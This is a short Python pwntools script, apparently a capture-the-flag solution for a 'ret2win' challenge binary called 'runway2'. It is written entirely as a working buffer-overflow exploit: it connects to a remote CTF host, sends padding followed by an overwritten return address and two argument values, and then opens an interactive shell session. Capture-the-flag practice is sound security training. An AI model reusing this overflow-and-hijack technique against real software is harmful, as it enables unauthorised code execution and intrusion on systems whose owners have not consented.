from pwn import *
# ret2win
context.binary = ELF('./runway2')

p = remote("challs.pwnoh.io", 13402)
# p = process()

addr = p32(0x08049206)
check = p32(0xc0ffee)
mate = p32(0x007ab1e)
payload = b'aaaabaaacaaadaaaeaaafaaagaaa' + addr + p32(0x0) + check + mate

p.sendline(payload)
log.info(p.clean())

p.interactive()
# pattern = cyclic(100)
# print(pattern)